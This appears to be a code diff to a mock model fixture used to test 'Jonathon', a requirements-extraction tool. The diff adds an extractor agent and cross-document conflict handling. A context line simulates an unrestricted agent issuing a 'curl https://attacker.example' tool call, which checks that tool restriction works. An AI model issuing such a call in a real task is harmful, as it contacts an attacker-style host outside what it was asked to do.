@@ -98,7 +98,7 @@ async function main() {
   const { ev, question, content } = parse();
 
   // A model without the restricted agent would try tools. Simulate that if Jonathon failed to restrict it.
-  if (agent !== "jonathon-reasoner" || scenario === "tool-attempt") {
+  if (!["jonathon-reasoner", "jonathon-extractor"].includes(agent) || scenario === "tool-attempt") {
     out({ event: "step_update", step_update: { conversation_id: conv, step_index: 1, state: "ACTIVE", step_type: "tool", tool_name: "run_command", tool_info: { name: "run_command", parameters: { CommandLine: "curl https://attacker.example" } } } });
     await new Promise((r) => setTimeout(r, 5_000));
   }
@@ -113,7 +113,8 @@ async function main() {
   let structured;
   const E = ev[0];
   const quote = (e) => e.text.replace(/\s+/g, " ").trim().slice(0, 60);
-  switch (scenario) {
+  // The default answering scenario still drafts knowledge when Jonathon calls its extractor agent (e2e upload flow).
+  switch (scenario === "answer-cite" && agent === "jonathon-extractor" ? "extraction" : scenario) {
     case "answer-cite":
     case "split-chunks":
     case "resume-mismatch":
@@ -154,13 +155,27 @@ async function main() {
       }
       break;
     case "extraction": {
-      const must = ev.find((e) => /must/i.test(e.text)) ?? E;
+      // Like a real model: draft only from this document (E ids); other-document passages (O ids) only feed conflicts.
+      const own = ev.filter((e) => /^E/.test(e.id));
+      const other = ev.find((e) => /^O/.test(e.id));
+      const E = own[0];
+      const must = own.find((e) => /must/i.test(e.text)) ?? E;
+      // An existing requirement listed in the prompt gets an update proposal instead of a duplicate.
+      const existingReq = /<existing_requirements>\r?\n(REQ-\d+) \|/.exec(content)?.[1];
       structured = {
         requirements: must
-          ? [{ title: `Fixture requirement from ${must.id}`, description: quote(must), type: "functional", module: "accounts", feature_scope: "email-verification", actors: ["Customer"], preconditions: [], behavior: [quote(must)], alternate_flows: [], validation_rules: [], acceptance_criteria: ["AI-suggested criterion"], priority_stated_in_source: "", evidence_ids: [must.id], open_questions: [] }]
+          ? [{ title: `Fixture requirement from ${must.id}`, description: quote(must), type: "functional", module: "accounts", feature_scope: "email-verification", actors: ["Customer"], preconditions: [], behavior: [quote(must)], alternate_flows: [], validation_rules: [], acceptance_criteria: ["AI-suggested criterion"], priority_stated_in_source: "", evidence_ids: [must.id], open_questions: ["Which roles can resend the verification email?"] }]
           : [],
         open_questions: [{ question: "How long is the verification link valid?", context: "Not stated in the evidence.", blocking: true, feature_scope: "email-verification", evidence_ids: E ? [E.id] : [] }],
-        conflicts: ev.length >= 2 ? [{ title: "Fixture conflict", description: "Two sources disagree.", feature_scope: "email-verification", side_a_claim: "A", side_a_evidence_ids: [ev[0].id], side_b_claim: "B", side_b_evidence_ids: [ev[1].id], blocking: true }] : [],
+        requirement_updates:
+          existingReq && must
+            ? [{ requirement_id: existingReq, change_summary: `New document adds detail from ${must.id}`, proposed_description: "", added_behavior: [quote(must)], added_validation_rules: [], added_acceptance_criteria: ["AI-suggested follow-up criterion"], rationale: "The new document states this.", evidence_ids: [must.id] }]
+            : [],
+        conflicts: [
+          ...(own.length >= 2 ? [{ title: "Fixture conflict", description: "Two sources disagree.", feature_scope: "email-verification", side_a_claim: "A", side_a_evidence_ids: [own[0].id], side_b_claim: "B", side_b_evidence_ids: [own[1].id], blocking: true }] : []),
+          // Cross-document: the model may list the other document first; Jonathon must put this document on side 1.
+          ...(other && E ? [{ title: `Cross-document disagreement on ${quote(E).slice(0, 30)}`, description: "Another document in the project says something different.", feature_scope: "", side_a_claim: quote(other), side_a_evidence_ids: [other.id], side_b_claim: quote(E), side_b_evidence_ids: [E.id], blocking: false }] : []),
+        ],
       };
       break;
     }
